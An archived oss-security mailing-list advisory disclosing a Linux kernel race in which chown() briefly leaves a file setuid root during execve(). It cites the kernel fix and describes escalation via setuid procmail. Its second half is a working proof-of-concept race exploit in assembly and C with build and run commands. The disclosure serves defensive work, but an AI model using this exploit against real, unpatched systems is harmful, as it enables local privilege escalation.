X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["4697" "Monday" "20" "April" "2015" "02:34:57" "+0200" "Jann Horn" "jann@thejh.net" "<20150420003456.GA16052@pc.thejh.net>" "135" "[oss-security] Linux: chown() was racy relative to execve()" nil nil nil "4" "2015042000:34:57" "[oss-security] Linux: chown() was racy relative to execve()" (number mark "        jann@thejh.n Apr 20  135/4697  " thread-indent "\"[oss-security] Linux: chown() was racy relative to execve()\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 24575 invoked by uid 550); 20 Apr 2015 00:35:15 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 24536 invoked from network); 20 Apr 2015 00:35:09 -0000
Message-ID: <20150420003456.GA16052@pc.thejh.net>
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha1;
	protocol="application/pgp-signature"; boundary="pf9I7BMVVzbSWLtt"
Content-Disposition: inline
User-Agent: Mutt/1.5.23 (2014-03-12)
Date: Mon, 20 Apr 2015 02:34:57 +0200
From: Jann Horn <jann@thejh.net>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] Linux: chown() was racy relative to execve()
To: oss-security@lists.openwall.com

--pf9I7BMVVzbSWLtt
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline

On non-ancient Linux machines, chown() clears the setuid and setgid bits.
However, until now, that was racy relative to execve(): While chown() took
the i_mutex while modifying owner, group and mode, execve() didn't take that
lock. Because chown() also set the user and group before setting the mode,
this meant that when root chown()ed an attacker-owned setuid file to root,
the file briefly was setuid root (and executable as such).

This was fixed here by taking the i_mutex in the execve path:
https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=8b01fc86b9f425899f8a3a8fc1c47d73c2c20543

Two programs for which this could be relevant are procmail and vsftpd.

vsftpd has this comment in privops.c (relevant only if the chown_uploads
option, which defaults to NO, is activated in the server config, see
process_post_login_req() in postprivparent.c):
  /* SECURITY! You need an OS which strips SUID/SGID bits on chown(),
   * otherwise a compromise of the FTP user will lead to compromise of
   * the "anon_upload_chown_uid" user (think chmod +s).
   */

procmail, when setuid root, does this when invoked as "procmail -d daemon" if
/var/mail/daemon does not exist yet (thanks to jduck for pointing me towards
procmail):
  chown("/var/mail/_QmG.F0wHVB.pc", 1, 8)

As far as I can tell, on a system where procmail is setuid root, this means
that an attacker who has gained access to the "mail" group, which has write
access to /var/mail, can use the chown race to escalate access to any non-root
uid. (procmail optimizes the chown away for root's mailbox.)

Note that *stat() can still show inconsistent data about uid, gid and mode.
This wasn't changed because the stat path is a lot hotter than execve and this
seems like a much bigger issue for execve() than for *stat().

Here's a simple PoC. exec.c is the attacker, chown2.c is the (privileged)
victim. You'll see the message "got root!" every time the attacker wins the
race.

Your console should get spammed with those messages rather quickly if you
don't uncomment the usleep - if you do uncomment it, it might take a while to
succeed or not work at all. On my desktop machine, it still won the race for
6% of all attempts, but on another machine, it seems like it doesn't work at
all with the usleep.

--------------------------------------------------------------------
# just use asm to avoid overhead of dynamic loader
$ cat > a.asm
bits 64

_start:
  mov rax, 107 ; SYS_geteuid
  syscall
  test rax, rax
  jnz exit
  mov rax, 1 ; SYS_write
  mov rdi, 1 ; stdout
  mov rsi, msg
  mov rdx, len
  syscall

exit:
  mov rax, 231 ; SYS_exit_group
  mov rdi, 0
  syscall

msg db 'got root!',0xa
len equ $ - msg
$ nasm -f elf64 -o a.o a.asm && ld -o a a.o
ld: warning: cannot find entry symbol _start; defaulting to 0000000000400080
$ cat > exec.c
#include <stdio.h>
#include <unistd.h>

int main(void) {
  int i = 0;
  while (1) {
    pid_t pid = vfork();
    if (pid < 0) return 1;
    if (pid == 0) {
      char *argv[] = { "a", NULL };
      execve("a", argv, argv);
      puts("execfail");
      return 1;
    }
    wait(NULL);
  }
}
$ gcc -o exec exec.c
$ cat > chown2.c
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

int main(void) {
  int fd = open("a", 0);
  if (fd < 0) return 1;
  while (1) {
    //usleep(100000); /* uncomment to make it a bit more realistic */
    if (fchown(fd, 0, 0) < 0) return 1;
    if (fchown(fd, 1000, 1000) < 0) return 1;
    if (fchmod(fd, 06755) < 0) return 1;
  }
}
$ gcc -o chown2 chown2.c
$ sudo ./chown2 & ./exec
--------------------------------------------------------------------

--pf9I7BMVVzbSWLtt
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: Digital signature

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQIcBAEBAgAGBQJVNEmwAAoJED4KNFJOeCOolLMQAJvzX+SG7hOy7ZPsyzzfmoa3
s9DFeA+oUBKu+ZUxyqqmLpz+BKfrZlKvPa5anAt+wImI5vy1VFyCKzTC9boxkeYm
6L7WlMFzygQRry71h3Ulcob5j5jRbNeCtaMM+dMFfaCdmDip7P3LRXvvts67ccjT
rv2caPf9LNaBswOkp9EKHYRcbDaxorTJEWr+AKvVPleScGz5vuUKIY69SZxeJsnk
XunHVLw+w2cW/cjsIW8Lt+a+ezbFJaYi/CSJrdWnS7GIZ6ok6NfzsjtDW6wCPO8E
KPD+7EtUWCoocnqrCzepLK8OfkcwXYnj6C+xKf5HGibVyMcGO30xNNiU7yROY82c
2wiLUV6SLQLZlyihhy4beyN1g2+S6QrP6JFvQdw8YbEJ/LfHSfxRjPh65M2kZ5fJ
Ooz0AE1Qge1O53qcdD+2z41J/QNyx6HOGU8wHw95PK40B5+m0FYPR/p3i/GURqUT
gBUWss0dz6m4HHHbHpk7oCfcXH0SciUymEqx/cciUmBLg4h7r1XF1tQO7YR5KTtU
3fT4FVj2QkJRoyYfWAB2V7kLKmS8G+9NMYdOpybVn93w9hq7/egowK8tVGghTIiX
mWzGEnWxn/xzdr5IJNzgES7Oysr17QDFMgoAOc0bwSNopWc1M/yaBmE1RRljFRjv
NjCD62EszRa+9E6brQyC
=nk3I
-----END PGP SIGNATURE-----

--pf9I7BMVVzbSWLtt--
